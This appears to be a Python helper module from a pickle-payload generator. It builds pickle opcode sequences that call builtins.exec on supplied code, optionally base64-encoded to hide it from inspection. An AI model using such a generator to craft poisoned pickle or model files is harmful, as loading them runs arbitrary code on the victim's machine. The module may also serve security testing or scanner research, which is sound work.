import base64

from utils.bytes_functions import _unicode_op, _import_op


def _encoded_unicode_op(string: str) -> bytes:
    """Put string into stack so that it will be base64 encoded in bytestream"""
    encoded = base64.standard_b64encode(string.encode("utf8"))
    args_op = b"(" + _unicode_op(encoded.decode("utf8")) + b"tR"
    return _import_op("base64", "standard_b64decode", True) + args_op


def _exec_code_op(code: str, encode=True) -> bytes:
    """Execute code operation"""
    op = _encoded_unicode_op(code) if encode else _unicode_op(code)
    return _import_op("builtins", "exec") + b"(" + op + b"tR"
